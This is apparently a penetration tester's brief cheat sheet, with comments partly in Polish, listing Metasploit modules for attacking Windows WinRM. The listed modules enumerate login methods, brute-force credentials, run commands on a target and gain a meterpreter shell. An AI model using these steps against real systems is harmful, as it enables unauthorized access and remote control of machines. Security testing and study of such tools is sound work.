```bash
# This is very important to know, before we try to connect to the WinRM service. We need to use a valid authentication method while connecting to the service
use auxiliary/scanner/winrm/winrm_auth_methods # czy winrm jest włączony i jekie metody logowania
use auxiliary/scanner/winrm/winrm_login # bruteforce winrm
auxiliary/scanner/winrm/winrm_cmd # Execute command on the target server
exploit/windows/winrm/winrm_script_exec # exploit na meterpreter, set FORCE_VBS true
```